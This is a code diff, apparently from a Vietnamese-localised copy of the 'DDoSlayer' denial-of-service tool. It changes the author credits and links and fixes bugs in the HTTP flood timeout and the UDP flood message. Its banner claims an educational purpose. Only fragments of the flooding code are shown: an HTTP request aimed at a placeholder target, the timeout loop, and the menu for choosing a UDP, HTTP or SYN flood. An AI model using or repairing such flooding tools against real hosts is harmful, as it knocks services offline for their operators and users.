@@ -10,8 +10,9 @@ os.system("clear")
 os.system("figlet DDoSlayer")
 
 print()
-print(colored("Tác giả   : Chris 'ViBoss Studio' Dhungx", 'green'))
-print(colored("Github    : https://github.com/dhungx", 'red'))
+print(colored("Tác giả   :  'ViBoss Studio' Dhungx", 'green'))
+print(colored("Github    : https://github.com/blackhatethicalhacking", 'red'))
+print(colored("YouTube   : https://www.youtube.com/channel/UC7-AsunT7zO-ny5-U8glqkw", 'green'))
 print(colored("Tấn công là cách phòng thủ tốt nhất!", 'magenta'))
 print(colored("Công cụ này được viết cho mục đích giáo dục - giúp đội ngũ phòng thủ hiểu rõ cách thức các cuộc tấn công diễn ra.", 'cyan'))
 print(colored("BHEH không chịu trách nhiệm về việc lạm dụng công cụ này và bạn phải ký NDA để thực hiện các cuộc tấn công như vậy", 'red'))
@@ -96,7 +97,7 @@ def http_flood(ip, port, duration):
     http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"
 
     sent = 0
-    timeout = time.time() + int(dur)
+    timeout = time.time() + int(duration)
 
     while True:
         try:
@@ -121,7 +122,7 @@ attack_type = input(colored(
     "Chọn loại tấn công (Chọn số) (1.UDP/2.HTTP/3.SYN): ", "green"))
 
 if attack_type == "1":
-    message = b"Đang gửi gói tin 1337"
+    message = "Đang gửi gói tin 1337".encode('utf-8')
     print(colored("Đã chọn tấn công UDP", "red"))
     udp_flood(ip, port, message, dur)
     print(colored("Đã hoàn thành tấn công UDP", "red"))
